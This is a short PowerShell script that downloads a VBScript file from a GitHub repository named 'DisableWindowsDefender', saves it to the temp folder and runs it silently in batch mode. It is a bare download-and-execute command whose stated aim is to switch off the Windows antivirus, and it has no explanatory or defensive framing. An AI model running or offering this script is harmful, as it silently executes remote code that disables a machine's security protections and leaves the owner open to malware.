$url = "https://raw.githubusercontent.com/Raroford32/DisableWindowsDefender/Raroford32-patch-1/carl.vbs"
$tempFile = "$env:temp\carl.vbs"
Invoke-WebRequest -Uri $url -OutFile $tempFile
cscript //B //NoLogo $tempFile
